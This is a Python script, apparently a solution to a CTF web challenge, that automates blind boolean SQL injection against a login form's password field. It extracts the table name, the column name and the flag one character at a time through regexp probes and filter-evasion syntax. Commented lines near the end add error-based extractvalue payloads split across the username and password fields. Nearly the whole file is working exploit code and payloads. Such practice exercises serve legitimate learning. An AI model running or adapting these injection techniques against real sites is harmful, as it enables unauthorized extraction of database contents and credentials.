# -*- coding: UTF-8 -*-

import string
import requests

url = 'http://ctf5.shiyanbar.com/web/baocuo/index.php'

mys = requests.session()
true_state = 'You are our member, welcome to enter'
#爆表名
model ="1' or !(length((select group_concat(table_name) from information_schema.tables where !(table_schema<>database())))<>%d) or '"
#注意此处的括号比较多，容易写多了
lens_table = 0
i = 0

while True:
    tmp = model % i
    data = {
        'username': 1,
        'password': tmp
    }

    res = mys.post(url, data=data).content
    if true_state in res:
        lens_table = i
        break
    i += 1

print 'length of table is: ' + str(lens_table)
#lens_table = 14

charset = string.digits + string.lowercase + '!_{}@~.'
strs_table = ''
model = "0' or (select group_concat(table_name) from information_schema.tables where !(table_schema<>database())) regexp '^%s' or '"

for i in range(lens_table):
    for ch in charset:
        tmp = model % (strs_table + ch)
        data = {
            'username': 1,
            'password': tmp
         }
        res = mys.post(url, data=data).content
        if true_state in res:
            strs_table += ch
            print 'regexp: ' + strs_table
            break
	pass
pass

print 'tablename is:'+ str(strs_table)
#strs_table = 'ffll44jj.users'

#爆列名
model ="1' or !(length((select group_concat(column_name) from information_schema.columns where !(table_name<>'ffll44jj')))<>%d) or '"
#注意此处的括号比较多，容易写多了
lens_column = 0
i = 0

while True:
    tmp = model % i
    data = {
        'username': 1,
        'password': tmp
    }

    res = mys.post(url, data=data).content
    if true_state in res:
        lens_column = i
        break
    i += 1

print 'length of column is: '+str(lens_column)
#lens_column = 14

charset = string.digits + string.lowercase + '!_{}@~.'
strs_column = ''
model = "1' or (select group_concat(column_name) from information_schema.columns where !(table_name<>'ffll44jj')) regexp '^%s' or '"

for i in range(lens_column):
    for ch in charset:
        tmp = model % (strs_column + ch)
        data = {
            'username': 1,
            'password': tmp
        }
        res = mys.post(url, data=data).content
        if true_state in res:
            strs_column += ch
            print 'regexp: ' + strs_column
            break
    pass
pass

print 'column_name is: ' + str(strs_column)

#print 'value'
#strs_column = 'value'

#爆flag
model ="1' or !(length((select group_concat(value) from ffll44jj))<>%d) or '"
#注意此处的括号比较多，容易写多了
lens_flag = 0
i = 0

while True:
    tmp = model % i
    data = {
        'username': 1,
        'password': tmp
    }

    res = mys.post(url, data=data).content
    if true_state in res:
        lens_flag = i
        break
    i += 1

print lens_flag
#lens_flag = 14

charset = string.digits + string.lowercase + ',!_{}@~.'
#该处的字符集尽量避免正则表达式中的特殊符号+ * ?等，因为+等表示前面的字符可出现多次，即使匹配到了，也不会在有效，
#比如本题中，flag中有一个+号，第一次是匹配到了，但在下一个字符匹配中，他会被当做正则中的+号处理，要求至少出现两次，
#从而后面的可能就匹配不上了。所以建议用.点号表示任意字符的匹配，匹配到.点时，用正则中的特殊字符替换，可能花一些时间。
flag = ''
model = "1' or (select group_concat(value) from ffll44jj) regexp '^%s' or '"

for i in range(lens_flag):
    for ch in charset:
        tmp = model % (flag + ch)
        data = {
            'username': 1,
            'password': tmp
        }
        res = mys.post(url, data=data).content
        if true_state in res:
            flag += ch
            print 'regexp: ' + flag
            break
    pass
pass

print 'flag is: ' + flag
#print 'flag{err0r_b4sed_sqli_._hpf}'

#法2：
#username=1' or extractvalue/*&password=*/(1,concat(0x23,database())) or '
#username=1' or extractvalue/*&password=*/(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema regexp database()))) or '
#username=1' or extractvalue/*&password=*/(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_name regexp 'ffll44jj'))) or '
#username=1' or extractvalue/*&password=*/(1,concat(0x23,(select value from ffll44jj))) or '
